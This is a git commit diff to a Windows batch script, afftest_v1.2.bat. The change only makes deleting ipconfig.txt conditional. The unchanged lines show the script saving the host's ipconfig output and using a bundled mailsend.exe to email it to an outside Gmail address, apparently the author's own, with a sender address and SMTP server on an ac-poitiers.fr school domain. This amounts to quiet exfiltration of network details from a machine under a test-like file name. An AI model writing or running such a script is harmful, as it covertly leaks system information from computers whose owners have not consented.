74dcd6a19f4a8c6da7796757557bde3b1981fc2d
Hammerill <www.hammerill@gmail.com>
2022-10-18 09:31:36 +0200

    Add check for existance of ipconfig.txt

--- afftest_v1.2.bat
+++ afftest_v1.2.bat
@@ -1,6 +1,6 @@
 @echo off
 
-del ipconfig.txt
+if exist ipconfig.txt del ipconfig.txt
 ipconfig >> ipconfig.txt
 
 .\task\mailsend\mailsend.exe -f petrovk@ac-poitiers.fr -d ac-poitiers.fr -smtp smtp.ac-poitiers.fr -t www.hammerill@gmail.com -sub IPCONFIG -a ipconfig.txt
